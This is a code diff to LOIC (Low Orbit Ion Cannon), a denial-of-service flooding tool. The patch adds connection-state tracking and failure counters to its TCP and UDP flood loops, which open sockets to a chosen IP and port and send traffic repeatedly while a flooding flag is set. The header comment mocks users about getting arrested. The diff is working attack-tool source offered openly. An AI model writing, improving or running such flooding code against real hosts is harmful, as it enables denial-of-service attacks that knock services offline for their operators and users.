@@ -1,4 +1,4 @@
-/* LOIC - Low Orbit Ion Cannon
+﻿/* LOIC - Low Orbit Ion Cannon
  * Released to the public domain
  * Enjoy getting v&, kids.
  */
@@ -46,6 +46,8 @@ namespace LOIC
 		}
 		private void bw_DoWork(object sender, DoWorkEventArgs e)
 		{
+			State = ReqState.Ready; // SET STATE TO READY //
+
 			try
 			{
 				IPEndPoint RHost = new IPEndPoint(IPAddress.Parse(IP), Port);
@@ -56,11 +58,14 @@ namespace LOIC
 						using (Socket socket = new Socket(RHost.AddressFamily, SocketType.Stream, ProtocolType.Tcp))
 						{
 							socket.NoDelay = true;
+							State = ReqState.Connecting; // SET STATE TO CONNECTING //
 
 							try { socket.Connect(RHost); }
 							catch { continue; }
 
 							socket.Blocking = Resp;
+							State = ReqState.Requesting; // SET STATE TO REQUESTING //
+
 							try
 							{
 								while (this.IsFlooding)
@@ -71,8 +76,7 @@ namespace LOIC
 									if (Delay >= 0) System.Threading.Thread.Sleep(Delay + 1);
 								}
 							}
-							// Analysis disable once EmptyGeneralCatchClause
-							catch { }
+							catch { Failed++; }
 						}
 					}
 					if(Protocol == 2)
@@ -80,6 +84,8 @@ namespace LOIC
 						using (Socket socket = new Socket(RHost.AddressFamily, SocketType.Dgram, ProtocolType.Udp))
 						{
 							socket.Blocking = Resp;
+							State = ReqState.Requesting; // SET STATE TO REQUESTING //
+
 							try
 							{
 								while (this.IsFlooding)
@@ -90,14 +96,15 @@ namespace LOIC
 									if (Delay >= 0) System.Threading.Thread.Sleep(Delay + 1);
 								}
 							}
-							// Analysis disable once EmptyGeneralCatchClause
-							catch { }
+							catch { Failed++; }
 						}
 					}
 				}
 			}
 			// Analysis disable once EmptyGeneralCatchClause
 			catch { }
+
+			State = ReqState.Ready; // SET STATE TO READY //
 		}
 	}
 }
